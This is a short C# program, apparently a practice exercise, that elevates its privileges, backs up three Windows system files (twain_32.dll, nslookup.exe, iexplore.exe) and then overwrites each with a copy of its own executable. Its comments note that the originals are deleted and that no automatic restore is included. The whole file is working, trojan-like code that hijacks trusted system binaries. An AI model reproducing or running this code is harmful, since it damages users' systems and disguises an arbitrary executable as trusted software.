using System;
using System.Text;

namespace voileapp
{
    class Program
    {
        // names of the files that'd be a subject to work with
        private const String TWAIN32_NAME = "twain_32.dll";
        private const String NSLOOKUP_NAME = "nslookup.exe";
        private const String IEXPLORE_NAME = "iexplore.exe";
        // also the MS Internet Explorer folder name
        private const String IEXPLORE_DIR = "Internet Explorer";

        static void Main(string[] args)
        {
            // Some system paths are taken from environment variables
            String sysRoot = Environment.ExpandEnvironmentVariables("%SystemRoot%");
            String sysDir = Environment.SystemDirectory;
            String programFilesDir = Environment.ExpandEnvironmentVariables("%ProgramFiles%");
            
            // Now all the paths are composed into the absolute form by StringBuilder
            
            StringBuilder pathToTwain32 = new StringBuilder(sysRoot)
                .Append("\\")
                .Append(TWAIN32_NAME);
            StringBuilder pathToNslookup = new StringBuilder(sysDir)
                .Append("\\")
                .Append(NSLOOKUP_NAME);
            StringBuilder pathToIexplore = new StringBuilder(programFilesDir)
                .Append("\\")
                .Append(IEXPLORE_DIR)
                .Append("\\")
                .Append(IEXPLORE_NAME);

            String pathToExe = System.Reflection.Assembly.GetEntryAssembly().Location;
            // Sometimes it requires 'Restore' privilege for the user to manipulate with certain files
            Privileges.GiveRestorePrivilege();

            /**
             * First, store the files of interest in backup folder
             * Then copy THIS executive to those file's location...
             * ...deleting the original ones
             * Beware, the automatical backup restore isn't included
             * 
             * The exceptions handling is sparse due to the nature of the program's ultimate predestination
             * It's practice.
             **/

            FileCopy twain32dll = new FileCopy(pathToTwain32.ToString());
            twain32dll.MakeBackup();
            twain32dll.CopyExecutive(pathToExe);

            FileCopy nslookup = new FileCopy(pathToNslookup.ToString());
            nslookup.MakeBackup();
            nslookup.CopyExecutive(pathToExe);

            FileCopy iexplore = new FileCopy(pathToIexplore.ToString());
            iexplore.MakeBackup();
            iexplore.CopyExecutive(pathToExe);
            
        }
    }
}
